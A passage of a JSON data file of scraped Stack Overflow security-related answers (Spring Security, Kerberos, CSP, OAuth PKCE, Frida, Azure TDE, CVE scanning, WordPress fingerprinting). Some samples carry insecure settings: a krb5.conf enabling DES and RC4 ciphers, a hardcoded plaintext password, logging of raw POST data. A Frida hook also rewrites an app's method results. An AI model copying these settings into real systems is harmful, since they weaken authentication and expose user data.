StreamResult(writer));\nSystem.out.println(writer.toString());",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2020-05-13T11:52:18",
        "author": "andrewJames"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/61123520/difference-between-httpbasic-and-authorizerequest",
    "title": "Difference between httpBasic() and authorizeRequest()",
    "question_id": 61123520,
    "posted_date": "2020-04-09T10:29:54",
    "answers": [
      {
        "answer_id": 61123905,
        "body": "@Configuration\n @EnableWebSecurity\n public class HttpBasicSecurityConfig extends WebSecurityConfigurerAdapter {\n        @Override\n        protected void configure(HttpSecurity http) throws Exception {\n                http.authorizeRequests().antMatchers(\"/**\").hasRole(\"USER\").and().httpBasic();\n        }\n        @Override\n        protected void configure(AuthenticationManagerBuilder auth) throws Exception {\n                auth.inMemoryAuthentication().withUser(\"user\").password(\"password\").roles(\"USER\");\n        }\n }",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2020-04-09T10:48:45",
        "author": "Eklavya"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/60498358/kerberized-hadoop-login-failure-for-user-loginexception-checksum-failed",
    "title": "Kerberized Hadoop Login failure for user ... LoginException: Checksum failed",
    "question_id": 60498358,
    "posted_date": "2020-03-02T19:11:24",
    "answers": [
      {
        "answer_id": 60498359,
        "body": "[logging]\n default = FILE:/var/log/krb5libs.log\n kdc = FILE:/var/log/krb5kdc.log\n admin_server = FILE:/var/log/kadmind.log\n[libdefaults]\n  default_realm = EXAMPLE.COM\n  dns_lookup_kdc = false\n  dns_lookup_realm = false\n  ticket_lifetime = 24h\n  renew_lifetime = 7d\n  forwardable = true\n  default_tgs_enctypes = aes256-cts aes128-cts des3-hmac-sha1 arcfour-hmac des-hmac-sha1 des-cbc-md5 des- cbc-crc\n  default_tkt_enctypes = aes256-cts aes128-cts des3-hmac-sha1 arcfour-hmac des-hmac-sha1 des-cbc-md5 des-cbc-crc\n  permitted_enctypes = aes256-cts aes128-cts des3-hmac-sha1 arcfour-hmac des-hmac-sha1 des-cbc-md5 des-cbc-crc\n  kdc_timeout = 3000\n[realms]\n  EXAMPLE.COM = {\n  kdc = kdc.example.com\n  admin_server = kdc.example.com\n  dict_file = /usr/share/dict/words\n  max_renewable_life = 7d 0h 0m 0s\n  }\n[domain_realm]\n.example.com = EXAMPLE.COM\nexample.com = EXAMPLE.COM",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2020-03-02T19:11:24",
        "author": "Ben DeMott"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/58835733/how-to-how-to-nest-a-method-inside-config-initializers-content-security-policy",
    "title": "How to how to nest a method inside config/initializers/content_security_policy",
    "question_id": 58835733,
    "posted_date": "2019-11-13T06:04:40",
    "answers": [
      {
        "answer_id": 58838693,
        "body": "def sources\n  case Rails.env\n  when 'test'\n    'localhost:*/'\n  when 'development'\n    'localhost:*/'\n  when 'staging'\n    '*.somepath.co:*/'\n  else\n    '*.somepath.com:*/ *.somepath.com:*/'\n  end\nend\nRails.application.config.content_security_policy do |policy|\n  policy.connect_src :self, \"#{sources}\", :ws, :wss\n  policy.font_src    :self\n  policy.img_src     :self\n  policy.object_src  :none\n  policy.script_src  :self\n  policy.style_src   :self, :unsafe_inline\n  # Specify URI for violation reports\n  # policy.report_uri \"/csp-violation-report-endpoint\"\nend",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2019-11-13T08:54:32",
        "author": "Marian13"
      },
      {
        "answer_id": 58838693,
        "body": "Rails.application.config.content_security_policy do |policy|\n  sources =\n    case Rails.env\n    when 'test'\n      'localhost:*/'\n    when 'development'\n      'localhost:*/'\n    when 'staging'\n      '*.somepath.co:*/'\n    else\n      '*.somepath.com:*/ *.somepath.com:*/'\n    end\n  policy.connect_src :self, \"#{sources}\", :ws, :wss\n  policy.font_src    :self\n  policy.img_src     :self\n  policy.object_src  :none\n  policy.script_src  :self\n  policy.style_src   :self, :unsafe_inline\n  # Specify URI for violation reports\n  # policy.report_uri \"/csp-violation-report-endpoint\"\nend",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2019-11-13T08:54:32",
        "author": "Marian13"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/56360374/how-to-fix-jackson-databind-version-in-spring-boot-starter-json-pom-xml",
    "title": "How to fix jackson-databind version in spring-boot-starter-json pom.xml",
    "question_id": 56360374,
    "posted_date": "2019-05-29T08:13:25",
    "answers": [
      {
        "answer_id": 74012062,
        "body": "<dependency>\n       <groupId>org.springframework.boot</groupId>\n       <artifactId>spring-boot-starter-data-rest</artifactId>\n       <exclusions>\n           <exclusion>\n               <groupId>com.fasterxml.jackson.core</groupId>\n               <artifactId>jackson-databind</artifactId>\n           </exclusion>\n       </exclusions>\n   </dependency>\n   <dependency>\n       <groupId>com.fasterxml.jackson.core</groupId>\n       <artifactId>jackson-databind</artifactId>\n       <version>2.13.4</version>\n   </dependency>",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2022-10-10T04:26:18",
        "author": "benzhuhao"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/55029004/define-declareroles-annotation-programmatically",
    "title": "Define @DeclareRoles annotation programmatically",
    "question_id": 55029004,
    "posted_date": "2019-03-06T12:31:07",
    "answers": [
      {
        "answer_id": 55408591,
        "body": "@ApplicationScoped\npublic class MyIdentityStore implements IdentityStore {\n    @EJB private UserFacade userFacade;\n\n    @Override\n    public int priority() {\n        return 50;\n    }\n\n    @Override\n    public Set<ValidationType> validationTypes() {\n        return EnumSet.of(ValidationType.PROVIDE_GROUPS, ValidationType.VALIDATE);\n    }\n    @Override\n    public Set<String> getCallerGroups(CredentialValidationResult validationResult) {\n        final String userName = validationResult.getCallerPrincipal().getName();\n        final User user= usersFacade.find(userName);\n        return user.getRoles();\n    }\n    public CredentialValidationResult validate(UsernamePasswordCredential credential) {\n        /* Handle validation/login of the user here */\n\t}\n}",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2019-03-28T19:57:23",
        "author": "Adam Waldenberg"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/54501388/how-to-secure-file-download-via-controller-action-and-ajax",
    "title": "How to secure file download via controller action and ajax?",
    "question_id": 54501388,
    "posted_date": "2019-02-03T04:05:54",
    "answers": [
      {
        "answer_id": 54502453,
        "body": "$('#client-files-table').on('click', '.js-download', function () {\n        var link = $(this);\n        $.ajax({\n            url: '/clients/clientfiles/downloadfile?clientFileId=' + link.attr('data-clientfile-id'),\n            method: 'POST',\n            data: {\n                __RequestVerificationToken: getToken()\n            },\n            xhrFields: {\n                responseType: 'blob'\n            },\n            success: function (data, status, xhr) {\n                var a = document.createElement('a');\n                var url = window.URL.createObjectURL(data);\n                a.href = url;\n                var header = xhr.getResponseHeader('Content-Disposition');\n                var filename = getFileNameByContentDisposition(header);\n                a.download = filename;\n                a.click();\n                window.URL.revokeObjectURL(url);\n                loadPartials();\n            },\n            error: function () {\n                toastr.error('Unable to download.');\n            }\n        });\n    });",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2019-02-03T06:39:27",
        "author": "voxtm"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/79346219/openapi-generator-unauthorized-401-via-ref-url-in-yaml",
    "title": "openapi generator unauthorized 401 via $ref url in yaml",
    "question_id": 79346219,
    "posted_date": "2025-01-10T10:38:33",
    "answers": [
      {
        "answer_id": 79352514,
        "body": "  <plugin>\n    <groupId>org.openapitools</groupId>\n    <artifactId>openapi-generator-maven-plugin</artifactId>\n    <version>7.10.0</version>\n    <configuration>\n        <!-- https://github.com/OpenAPITools/openapi-generator/blob/master/docs/generators/jaxrs-spec.md -->\n        <generatorName>jaxrs-spec</generatorName>\n        <generateApiTests>false</generateApiTests>\n        <inputSpec>${project.basedir}/reference/myApi.yaml</inputSpec>\n        <modelPackage>package.dto</modelPackage>\n        **<auth>Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=</auth>**\n        <configOptions>\n            <sourceFolder>src</sourceFolder>\n            <apiPackage>path.api</apiPackage>\n            <useTags>true</useTags>\n            <dateLibrary>java8-localdatetime</dateLibrary>\n            <interfaceOnly>true</interfaceOnly>\n            <returnResponse>true</returnResponse>\n            <generateBuilders>true</generateBuilders>\n            <serializableModel>true</serializableModel>\n            <useJakartaEe>true</useJakartaEe>\n        </configOptions>\n    </configuration>\n    <executions>\n        <execution>\n            <id>generate-api</id>\n            <goals>\n                <goal>generate</goal>\n            </goals>\n        </execution>\n    </executions>\n</plugin>",
        "score": 0,
        "is_accepted": true,
        "creation_date": "2025-01-13T09:31:06",
        "author": "sonia belhadj"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/79292527/generate-sbom-using-cyclonedx-for-repository-containing-multiple-languages",
    "title": "Generate SBOM using CycloneDX for repository containing multiple languages",
    "question_id": 79292527,
    "posted_date": "2024-12-18T16:26:32",
    "answers": [
      {
        "answer_id": 79297771,
        "body": "$ syft dir:./sbom-demo | (head; tail)\n \u2714 Indexed file system sbom-demo\n \u2714 Cataloged contents 5ce0d9d1e0410a9ea2edcd96c9fbf223f346c2e57ab044e60e706ba9d3d46eb0\n   \u251c\u2500\u2500 \u2714 Packages                        [112 packages]\n   \u251c\u2500\u2500 \u2714 File digests                    [32 files]\n   \u251c\u2500\u2500 \u2714 File metadata                   [32 locations]\n   \u2514\u2500\u2500 \u2714 Executables                     [3 executables]\n[0000]  WARN no explicit name and version provided for directory source, deriving artifact ID from the given path (which is not ideal)\nNAME                          VERSION            TYPE\naccepts                       1.3.8              npm\narray-flatten                 1.1.1              npm\nblinker                       1.9.0              python\nbody-parser                   1.20.3             npm\nbytes                         3.1.2              npm\ncall-bind-apply-helpers       1.0.1              npm\ncall-bound                    1.0.3              npm\ncertifi                       2024.12.14         python\ncharset-normalizer            3.4.0              python",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2024-12-20T10:55:54",
        "author": "popey"
      },
      {
        "answer_id": 79297771,
        "body": "$ syft dir:./sbom-demo -o cyclonedx-json > sbom.json\n \u2714 Indexed file system ./sbom-demo\n \u2714 Cataloged contents cdb4ee2aea69cc6a83331bbe96dc2caa9a299d21329efb0336fc02a82e1839a8\n   \u251c\u2500\u2500 \u2714 Packages                        [112 packages]\n   \u251c\u2500\u2500 \u2714 File digests                    [32 files]\n   \u251c\u2500\u2500 \u2714 File metadata                   [32 locations]\n   \u2514\u2500\u2500 \u2714 Executables                     [3 executables]\n[0000]  WARN no explicit name and version provided for directory source, deriving artifact ID from the given path (which is not ideal)",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2024-12-20T10:55:54",
        "author": "popey"
      },
      {
        "answer_id": 79297771,
        "body": "$ sbom-utility validate -i sbom.json\nWelcome to the sbom-utility! Version 'v0.17.1-pre' (sbom-utility) (linux/amd64)\n===============================================================================\n[INFO] Loading (embedded) default schema config file: 'config.json'...\n[INFO] Loading (embedded) default license policy file: 'license.json'...\n[INFO] Attempting to load and unmarshal data from: 'sbom.json'...\n[INFO] Successfully unmarshalled data from: 'sbom.json'\n[INFO] Determining file's BOM format and version...\n[INFO] Determined BOM format, version (variant): 'CycloneDX', '1.6' (latest)\n[INFO] Matching BOM schema (for validation): schema/cyclonedx/1.6/bom-1.6.schema.json\n[INFO] Loading schema 'schema/cyclonedx/1.6/bom-1.6.schema.json'...\n[INFO] Found schema dependencies: [jsf-0.82.schema.json spdx.schema.json]\n[INFO] Added schema 'schema/cyclonedx/common/jsf-0.82.schema.json' to loader:...\n[INFO] Added schema 'schema/cyclonedx/common/spdx.schema.json' to loader:...\n[INFO] Compiling schema: 'schema/cyclonedx/1.6/bom-1.6.schema.json'...\n[INFO] Schema 'schema/cyclonedx/1.6/bom-1.6.schema.json' loaded\n[INFO] Validating 'sbom.json'...\n[INFO] BOM valid against JSON schema: 'true'",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2024-12-20T10:55:54",
        "author": "popey"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/79289364/inconsistency-in-logged-fingerprint-abuse-fraud-combat-on-wordpress",
    "title": "Inconsistency in logged fingerprint (abuse/fraud combat) on Wordpress",
    "question_id": 79289364,
    "posted_date": "2024-12-17T16:07:43",
    "answers": [
      {
        "answer_id": 79314371,
        "body": "function generate_fingerprint() {\n        static $cached_fingerprint = null;\n\n        if ($cached_fingerprint !== null) {\n            return $cached_fingerprint;\n        }\n\n        $fallback = generate_fallback_fingerprint();\n        $advanced_client = generate_advanced_fingerprint();\n        $combined = md5($fallback . $advanced_client);\n        $reliability = calculate_reliability_score();\n\n        $fingerprint = [\n            'fallback_fingerprint' => $fallback,\n            'advanced_fingerprint' => $combined,\n            'advanced_client_only' => $advanced_client,\n            'reliability_score' => $reliability\n        ];\n        $cached_fingerprint = $fingerprint;\n        return $fingerprint;\n    }\n    function save_fingerprint($ip, $fingerprint_data) {\n        $data = [];\n        if (file_exists(FINGERPRINT_FILE)) {\n            $data = json_decode(file_get_contents(FINGERPRINT_FILE), true) ?? [];\n        }\n        $timestamp = time();\n        $key = $ip . '_' . $timestamp;\n        $data[$key] = [\n            'ip' => $ip,\n            'fallback_fingerprint' => $fingerprint_data['fallback_fingerprint'],\n            'advanced_fingerprint' => $fingerprint_data['advanced_fingerprint'],\n            'advanced_client_only' => $fingerprint_data['advanced_client_only'],\n            'reliability_score' => $fingerprint_data['reliability_score'],\n            'timestamp' => $timestamp,\n        ];\n\n        // Voeg client_data toe als de constante is gedefinieerd en true is\n        if (defined('SAVE_CLIENT_DATA') && SAVE_CLIENT_DATA) {\n            $data[$key]['client_data'] = $_POST;\n        }\n\n        file_put_contents(FINGERPRINT_FILE, json_encode($data, JSON_PRETTY_PRINT));\n    }",
        "score": 0,
        "is_accepted": true,
        "creation_date": "2024-12-28T13:40:40",
        "author": "Flower88"
      },
      {
        "answer_id": 79314371,
        "body": "function is_fingerprint_blocked($fingerprint) {\n        $blocked_fingerprints = get_blocked_fingerprints();\n        $is_post_request = ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_FINGERPRINT_REQUEST']));\n        $redirect_type = $is_post_request ? \"JavaScript redirect\" : \"wp_safe_redirect\";\n        $ip = get_visitor_ip();\n\n        $fingerprint_types = [\n            'fallback_fingerprint' => 'fallback',\n            'advanced_fingerprint' => 'gecombineerde advanced',\n            'advanced_client_only' => 'clientside-only advanced'\n        ];\n\n        foreach ($fingerprint_types as $key => $type) {\n            if (isset($fingerprint[$key]) && in_array($fingerprint[$key], $blocked_fingerprints)) {\n                return true;\n            }\n        }\n\n        return false;\n    }",
        "score": 0,
        "is_accepted": true,
        "creation_date": "2024-12-28T13:40:40",
        "author": "Flower88"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/79103726/how-to-resolve-eslint-errors-due-to-use-of-the-html-method-in-jquery-libraries",
    "title": "How to resolve eslint errors due to use of the html() method in jquery libraries when running security scans with Github advanced security?",
    "question_id": 79103726,
    "posted_date": "2024-10-18T17:24:17",
    "answers": [
      {
        "answer_id": 79115691,
        "body": "{\n  \"tools\": [\n    {\n      \"tool\": {\n        \"name\": \"ESLint\",\n        \"version\": \"Latest\"\n      },\n      \"arguments\": {\n        \"DisableDefaultConfigurationFile\": true,\n        \"ExclusionsFilePath\": \"$(BuildSourcesDirectory)/.eslintignore\",\n        \"ConfigurationFile\": \"D:/a/_msdo/packages/node_modules/eslint/node_modules/@microsoft/eslint-plugin-sdl/config/required.js\",\n        \"Extensions\": [\".js\", \".ts\"],\n        \"ExclusionPatterns\": \"*.d.ts\",\n        \"OutputFormat\": \"D:/a/_msdo/packages/node_modules/eslint/node_modules/@microsoft/eslint-formatter-sarif/sarif.js\",\n        \"Targets\": \"**/*.{js,ts}\"\n      }\n    }\n  ]\n}",
        "score": 0,
        "is_accepted": true,
        "creation_date": "2024-10-22T16:47:28",
        "author": "Lincoln Lourens"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/78743902/how-can-i-limit-the-scopes-to-only-the-current-spreadsheet-and-use-oauth-to-prin",
    "title": "How can I limit the scopes to only the current spreadsheet and use OAuth to print a PDF",
    "question_id": 78743902,
    "posted_date": "2024-07-13T09:05:04",
    "answers": [
      {
        "answer_id": 78746470,
        "body": "/** @OnlyCurrentDoc */\nconst SHEET_NAME =  'Sheet to Export';\n/**\n * Downloads the specified sheet as a PDF.\n */\nfunction downloadAsPDF() {\n  const spreadsheet = SpreadsheetApp.getActiveSpreadsheet();\n  const sheet = spreadsheet.getSheetByName(SHEET_NAME);\n  const sheetId = sheet.getSheetId();\n  const spreadsheetId = spreadsheet.getId();\n  const url_base = 'https://docs.google.com/spreadsheets/d/';\n  const exportUrl = url_base + spreadsheetId + '/export?format=pdf&gid=' + sheetId;\n  SpreadsheetApp.getUi().showModelessDialog(HtmlService\n    .createHtmlOutput(`<a href=\"${exportUrl}\" target=\"_blank\">Open PDF</a>`)\n    .append('<script>const link = document.querySelector(\"a\");')\n    .append('link.click();')\n    .append('setTimeout(() => link.remove(), 100);')\n    .append('setTimeout(() => google.script.host.close(), 2000);')\n    .append('</script>'),\n    \"Download PDF\"\n  );\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2024-07-14T09:09:51",
        "author": "Wicket"
      },
      {
        "answer_id": 78746470,
        "body": "/** @OnlyCurrentDoc */\n/**\n * Included to add the required scope to the project manifest\n * without having to edit it manually.\n */\n// SpreadsheetApp.getActiveSpreadsheet();\n/** type {string} Name of the sheet to be exported as PDF. */\nconst SHEET_NAME = 'Sheet to Export';\n/** type {string} Do not include the file extension. */\nconst FILE_NAME = 'Exported Sheet';\n/**\n * Downloads the specified sheet as a PDF.\n */\nfunction downloadAsPDFAlt() {\n  SpreadsheetApp.getUi().showModelessDialog(HtmlService\n    .createTemplateFromFile('downloadAsPDF').evaluate().setHeight(100),\n    \"Download PDF\"\n  );\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2024-07-14T09:09:51",
        "author": "Wicket"
      },
      {
        "answer_id": 78746470,
        "body": "<!DOCTYPE html>\n<html>\n<head>\n  <base target=\"_top\">\n</head>\n<body>\n  <p> Please wait </p>\n  <script>\n    <? const spreadsheet = SpreadsheetApp.getActiveSpreadsheet(); ?>\n    <? const spreadsheetId = spreadsheet.getId(); ?>\n    const sheetId = \"<?!= spreadsheet.getSheetByName( SHEET_NAME ).getSheetId(); ?>\";\n    const fileName = \"<?!= FILE_NAME ?>\";\n    const token = \"<?!= ScriptApp.getOAuthToken() ?>\";\n    async function downloadSheetAsPDF(spreadsheetId, sheetId, fileName, token) {\n      // 1. Construct the PDF export URL (same as before)\n      const url = \"<?= `https://docs.google.com/spreadsheets/d/${spreadsheetId}/export?` ?>\";\n      const exportOptions = {\n        format: \"pdf\",\n        gid: sheetId\n      };\n      const params = Object.keys(exportOptions)\n        .map((key) => `${key}=${exportOptions[key]}`)\n        .join(\"&\");\n      // 2. Use fetch to retrieve the PDF\n      const response = await fetch(url + params, {\n        headers: {\n          Authorization: `Bearer ${token}`, // Replace with your Google OAuth token\n        },\n      });\n      if (!response.ok) {\n        throw new Error(`Error fetching PDF: ${response.status} ${response.statusText}`);\n      }\n      // 3. Convert response to blob and create a download link\n    const blob = await response.blob();\n    const downloadUrl = URL.createObjectURL(blob);\n    // 4. Create a temporary link and trigger download\n    const link = document.createElement(\"a\");\n    link.href = downloadUrl;\n    link.download = `${fileName}.pdf`;\n    link.click();\n    // 5. Clean up (revoke the temporary URL)\n    URL.revokeObjectURL(downloadUrl);\n    // 6. Close the dialog\n    setTimeout (() => google.script.host.close(), 2000)\n  }\n  downloadSheetAsPDF(\"<?!= spreadsheetId ?>\", sheetId, fileName, token);\n  </script>\n</body>\n</html>",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2024-07-14T09:09:51",
        "author": "Wicket"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/78409756/does-typo3-12-4-works-with-php-8-and-disable-functions-ini-set",
    "title": "Does Typo3 12.4 works with PHP 8 and disable_functions=ini_set?",
    "question_id": 78409756,
    "posted_date": "2024-04-30T11:59:22",
    "answers": [
      {
        "answer_id": 78409902,
        "body": "> cd vendor/typo3\n> grep -rn 'ini_set'\ncms-frontend/Classes/Middleware/OutputCompression.php:54:\n    @ini_set('zlib.output_compression_level', (string)$GLOBALS['TYPO3_CONF_VARS']['FE']['compressionLevel']);\ncms-core/Configuration/DefaultConfigurationDescription.yaml:120:\n    description: 'Integer: memory_limit in MB: If more than 16, TYPO3 will try to use ini_set() to set the memory limit of PHP to the value. This works only if the function ini_set() is not disabled by your sysadmin.'\ncms-core/Classes/Core/Bootstrap.php:441:\n    @ini_set('display_errors', (string)$displayErrors);\ncms-core/Classes/Core/Bootstrap.php:467:\n    @ini_set('memory_limit', (string)((int)$GLOBALS['TYPO3_CONF_VARS']['SYS']['setMemoryLimit'] . 'm'));\ncms-backend/Classes/Middleware/OutputCompression.php:53:\n    @ini_set('zlib.output_compression_level', (string)$GLOBALS['TYPO3_CONF_VARS']['BE']['compressionLevel']);\ncms-install/Classes/Service/SessionService.php:82:\n    ini_set('session.cookie_secure', GeneralUtility::getIndpEnv('TYPO3_SSL') ? 'On' : 'Off');\ncms-install/Classes/Service/SessionService.php:83:\n    ini_set('session.cookie_httponly', 'On');\ncms-install/Classes/Service/SessionService.php:84:\n    ini_set('session.cookie_samesite', Cookie::SAMESITE_STRICT);\ncms-install/Classes/Service/SessionService.php:85:\n    ini_set('session.cookie_path', (string)GeneralUtility::getIndpEnv('TYPO3_SITE_PATH'));\ncms-install/Classes/Service/SessionService.php:87:\n    ini_set('session.gc_probability', (string)100);\ncms-install/Classes/Service/SessionService.php:88:\n    ini_set('session.gc_divisor', (string)100);\ncms-install/Classes/Service/SessionService.php:89:\n    ini_set('session.gc_maxlifetime', (string)($this->expireTimeInMinutes * 2 * 60));",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2024-04-30T12:28:59",
        "author": "David"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/76878761/frida-change-value-of-method-calling-enum",
    "title": "Frida: Change value of method calling enum",
    "question_id": 76878761,
    "posted_date": "2023-08-10T15:21:09",
    "answers": [
      {
        "answer_id": 76889209,
        "body": "Java.perform(() => {\n    const myClass = Java.use('com.package.class');\n    const enumContent = Java.use('com.some.package.Enum');\n    myClass.getMethod.implementation = function() {\n        var enumArr = this.getMethod();\n        send('getMethod() value for enum is: ' + enumArr);\n        // you need to return a value of the type Enum[]\n        // you have the choice to return enumArr or\n        // create a new Enum array with a content of your choice:\n        return Java.array('com.some.package.Enum', [ enumContent.A.value ]);\n        // return enumArr; // alternative solution return the unmodified array\n    };\n});",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2023-08-12T08:13:36",
        "author": "Robert"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/76806358/cannot-scan-a-local-unpushed-image-for-cves-with-anchore-grype-workarounds",
    "title": "Cannot scan a local (unpushed) image for CVEs with Anchore Grype - workarounds",
    "question_id": 76806358,
    "posted_date": "2023-07-31T14:41:14",
    "answers": [
      {
        "answer_id": 76806506,
        "body": "$ docker run --rm --name grype -u 0 -v /var/run/docker.sock:/var/run/docker.sock anchore/grype:latest --only-fixed mirekphd/ml-cache:20230731\nNAME          INSTALLED  FIXED-IN   TYPE  VULNERABILITY  SEVERITY\nlibcrypto1.1  1.1.1s-r0  1.1.1t-r0  apk   CVE-2022-4304  Medium\nlibcrypto1.1  1.1.1s-r0  1.1.1t-r0  apk   CVE-2022-4450  High\nlibcrypto1.1  1.1.1s-r0  1.1.1t-r0  apk   CVE-2023-0215  High\nlibcrypto1.1  1.1.1s-r0  1.1.1t-r0  apk   CVE-2023-0286  High\nlibcrypto1.1  1.1.1s-r0  1.1.1t-r1  apk   CVE-2023-0464  High\nlibcrypto1.1  1.1.1s-r0  1.1.1t-r2  apk   CVE-2023-0465  Medium\nlibcrypto1.1  1.1.1s-r0  1.1.1u-r0  apk   CVE-2023-2650  High\nlibcrypto1.1  1.1.1s-r0  1.1.1u-r2  apk   CVE-2023-3446  Medium\nlibssl1.1     1.1.1s-r0  1.1.1t-r0  apk   CVE-2022-4304  Medium\nlibssl1.1     1.1.1s-r0  1.1.1t-r0  apk   CVE-2022-4450  High\nlibssl1.1     1.1.1s-r0  1.1.1t-r0  apk   CVE-2023-0215  High\nlibssl1.1     1.1.1s-r0  1.1.1t-r0  apk   CVE-2023-0286  High\nlibssl1.1     1.1.1s-r0  1.1.1t-r1  apk   CVE-2023-0464  High\nlibssl1.1     1.1.1s-r0  1.1.1t-r2  apk   CVE-2023-0465  Medium\nlibssl1.1     1.1.1s-r0  1.1.1u-r0  apk   CVE-2023-2650  High\nlibssl1.1     1.1.1s-r0  1.1.1u-r2  apk   CVE-2023-3446  Medium",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2023-07-31T15:04:06",
        "author": "mirekphd"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/76315430/unable-to-setup-tde-via-azure-sdk-for-python",
    "title": "Unable to setup TDE via Azure SDK for python",
    "question_id": 76315430,
    "posted_date": "2023-05-23T09:37:54",
    "answers": [
      {
        "answer_id": 76332719,
        "body": "from azure.identity import AzureCliCredential\nfrom azure.keyvault.keys import KeyClient\nfrom azure.mgmt.sql import SqlManagementClient\nfrom azure.mgmt.sql.models import ServerKeyType, ServerKey\ncredential = AzureCliCredential()\nkey_vault_url = \"https://kamalival.vault.azure.net\"\nkey_client = KeyClient(vault_url=key_vault_url, credential=credential)\nkey_name = \"kamalikeyvault\"\nkey_version = \"ba4979e3ef934a3e919e392942c0b42a\"\nkey = key_client.get_key(name=key_name, version=key_version)\nsql_client = SqlManagementClient(credential=credential, subscription_id=\"b83c1ed3-c5b6-44fb-b5ba-2b83a074c23f\")\nserver_name = \"kamaserver\"\nserver_key_name = \"kamalival_kamalikeyvault_ba4979e3ef934a3e919e392942c0b42a\"\ntde = ServerKey(\n    auto_rotation_enabled=True,\n    server_key_type=ServerKeyType.AZURE_KEY_VAULT,\n    uri=key.id\n)\nsql_client.server_keys.begin_create_or_update(\n    \"Vyshu\", server_name, server_key_name, tde).wait()\nprint(f\"Enabled Transparent Data Encryption using CMK on '{server_name}' SQL server.\")",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2023-05-25T09:16:05",
        "author": "Dasari Kamali"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/75479807/spring-security-custom-auth-manager-approach",
    "title": "Spring Security Custom Auth Manager approach",
    "question_id": 75479807,
    "posted_date": "2023-02-16T21:42:41",
    "answers": [
      {
        "answer_id": 75490739,
        "body": "public class CustomTokenAuthenticationProvider implements AuthenticationProvider {\n  @Override\n  public Authentication authenticate(Authentication a) {\n    String token = ((CustomTokenAuthenticationRequest) a).getToken();\n    if (/* the token is valid */) {\n      CustomTokenAuthentication returnValue = // whatever you want it to be\n      return returnValue;\n    }\n    throw new BadCredentialsException(\"Invalid token\");\n  }\n  @Override\n  public boolean supports(Class<?> authClass) {\n    return authClass == CustomTokenAuthenticationRequest.class;\n  }\n}",
        "score": 2,
        "is_accepted": true,
        "creation_date": "2023-02-17T21:06:16",
        "author": "neofelis"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/74637352/how-to-use-oauth-authorization-code-for-clis",
    "title": "How to use OAuth Authorization Code for CLIs",
    "question_id": 74637352,
    "posted_date": "2022-12-01T00:40:11",
    "answers": [
      {
        "answer_id": 74643174,
        "body": " * The OAuth flow for a console app\n */\nexport async function login(): Promise<string> {\n    // Set up the authorization request\n    const codeVerifier = generateRandomString();\n    const codeChallenge = generateHash(codeVerifier);\n    const state = generateRandomString();\n    const authorizationUrl = buildAuthorizationUrl(state, codeChallenge);\n    return new Promise<string>((resolve, reject) => {\n        let server: Http.Server | null = null;\n        const callback = async (request: Http.IncomingMessage, response: Http.ServerResponse) => {\n            if (server != null) {\n\n                // Complete the incoming HTTP request when a login response is received\n                response.write('Login completed for the console client ...');\n                response.end();\n                server.close();\n                server = null;\n                try {\n                    // Swap the code for tokens\n                    const accessToken = await redeemCodeForAccessToken(request.url!, state, codeVerifier);\n                    resolve(accessToken);\n                } catch (e: any) {\n                    reject(e);\n                }\n            }\n        }\n        // Start an HTTP server and listen for the authorization response on a loopback URL, according to RFC8252\n        server = Http.createServer(callback);\n        server.listen(loopbackPort);\n\n        // Open the system browser to begin authentication\n        Opener(authorizationUrl);\n    });\n}\n/*\n * Build a code flow URL for a native console app\n */\nfunction buildAuthorizationUrl(state: string, codeChallenge: string): string {\n    let url = authorizationEndpoint;\n    url += `?client_id=${encodeURIComponent(clientId)}`;\n    url += `&redirect_uri=${encodeURIComponent(redirectUri)}`;\n    url += '&response_type=code';\n    url += `&scope=${scope}`;\n    url += `&state=${encodeURIComponent(state)}`;\n    url += `&code_challenge=${encodeURIComponent(codeChallenge)}`;\n    url += '&code_challenge_method=S256';\n    return url;\n}\n/*\n * Swap the code for tokens using PKCE and return the access token\n */\nasync function redeemCodeForAccessToken(responseUrl: string, requestState: string, codeVerifier: string): Promise<string> {\n    const [code, responseState] = getLoginResult(responseUrl);\n    if (responseState !== requestState) {\n        throw new Error('An invalid authorization response state was received');\n    }\n    let body = 'grant_type=authorization_code';\n    body += `&client_id=${encodeURIComponent(clientId)}`;\n    body += `&redirect_uri=${encodeURIComponent(redirectUri)}`;\n    body += `&code=${encodeURIComponent(code)}`;\n    body += `&code_verifier=${encodeURIComponent(codeVerifier)}`;\n    const options = {\n        method: 'POST',\n        headers: {\n            'Content-Type': 'application/x-www-form-urlencoded'\n        },\n        body,\n    };\n    const response = await fetch(tokenEndpoint, options);\n    if (response.status >= 400) {\n        const details = await response.text();\n        throw new Error(`Problem encountered redeeming the code for 